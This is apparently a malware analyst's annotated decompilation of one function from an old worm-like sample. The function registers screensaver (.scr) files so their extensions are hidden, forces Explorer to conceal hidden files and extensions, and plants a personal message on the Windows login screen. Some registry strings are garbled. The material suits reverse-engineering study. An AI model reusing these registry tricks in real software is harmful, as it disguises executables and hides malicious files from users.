' Makes the main registry modifications and installs the creepy screen
Public Function funct5() '405F80
  'Data Table: 401838
  Dim regpath_winlogon As Variant
  Dim creepy_msg_pt1 As String
  Dim creepy_msg_pt2 As String

' Note: Still remains figuring out what each registry key does. Pending.

' Note: In Visual Basic, the symbol "&" is NOT a logical "AND",
' and is used EXCLUSIVELY for string concatenation

' Variable naming convention definition:
' Every STATIC STRING-type variable containing a REGISTRY key OR path SHOULD be prefixed by the string "regpath_"
' Every NON-STATIC STRING-type variable containing a REGISTRY key OR path SHOULD be prefixed by the string "regpath_", and should contain a descriptive name

' vbCrLf -> "\n": vbCrLf stands for Visual Basic Carriage Return Line Feed. In short, "next line".

  loc_405C67: HKCR = "HKEY_CLASSES_ROOT\scrfile" 'Variant
  loc_405C78: Proc_1_10_404014(regpath_winlogon, CStr(HKCR))

  ' Installs the vital regkeys
  loc_405C93: AddRegKey(regpath_winlogon, CStr(HKCR), vbNullString)
  loc_405CAE: AddRegKey(regpath_winlogon, CStr(HKCR), "InfoTip")
  loc_405CC9: AddRegKey(regpath_winlogon, CStr(HKCR), "NeverShowExt", vbNullString)
  loc_405CE4: AddRegKey(regpath_winlogon, CStr(HKCR), "TileInfo", vbNullString)
  loc_405D08: AddRegKey(var_D8, CStr(HKCR & "\shell\open\command"), vbNullString, "%1")

  loc_405D1C: regpath_microsoft = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\" 'Variant
  loc_405D28: regpath_winlogon = regpath_microsoft & "Windo?s NT\CurrentVersion\Winlogon???" ' Corrupted registry key?
  loc_405D2C: regpath_winlogon2 = regpath_winlogon 'Variant

  ' Adds the creepy message to the login screen
  loc_405D40: AddRegKey(regpath_winlogon, CStr(regpath_winlogon2), "?egalNoticeCaption", "81u3f4nt45y - 24.01.2007 - Surabaya")
  loc_405D67: creepy_msg_pt1 = "Surabaya in my birthday" & vbCrLf & "Don't kill me, i'm just send message from your computer" & vbCrLf & "Terima kasih telah menemaniku walaupun hanya sesaat, tapi bagiku sangat berarti"
  loc_405D83: creepy_msg_pt2 = creepy_msg_pt1 & vbCrLf & "Maafkan jika kebahagiaan yang kuminta adalah teman sepanjang hidupku" & vbCrLf & "Seharusnya aku mengerti bahwa keberadaanku bukanlah disisimu, hanyalah lamunan dalam sesal"
  loc_405DA1: AddRegKey(regpath_winlogon, CStr(regpath_winlogon2), "LegalNoticeText", creepy_msg_pt2 & vbCrLf & "Untuk kekasih yang tak kan pernah kumiliki 3r1k1m0")

  ' Finish installing the registry keys
  loc_405DC7: var_130 = "CheckedValue" 'Variant
  loc_405DD0: var_140 = "DefaultValue" 'Variant
  loc_405DE0: regpath_folder = regpath_microsoft & "Windows\CurrentVersion\explorer\Advanced\Folder\" 'Variant
  loc_405DF0: regpath_hidden = regpath_folder & "Hidden\" 'Variant
  loc_405DFC: regpath_winlogon = regpath_hidden & "NOHIDDEN" 
  loc_405E00: var_170 = regpath_winlogon 'Variant
  loc_405E1A: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 2)
  loc_405E3F: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 2)
  loc_405E56: regpath_winlogon = regpath_hidden & "NOHIDORSYS" 
  loc_405E5A: var_170 = regpath_winlogon 'Variant
  loc_405E74: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 0)
  loc_405E99: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 2)
  loc_405EB0: regpath_winlogon = regpath_hidden & "SHOWALL" 
  loc_405EB4: var_170 = regpath_winlogon 'Variant
  loc_405ECE: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 0)
  loc_405EF3: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 2)
  loc_405F0A: regpath_winlogon = regpath_folder & "HideFileExt" 
  loc_405F0E: var_170 = regpath_winlogon 'Variant
  loc_405F28: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_130), 1)
  loc_405F4D: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), CStr(var_140), 1)
  loc_405F6E: Proc_1_2_4044D4(regpath_winlogon, CStr(var_170), "UncheckedValue", 1)
  loc_405F79: funct5 = vbNullString ' Dont return
End Function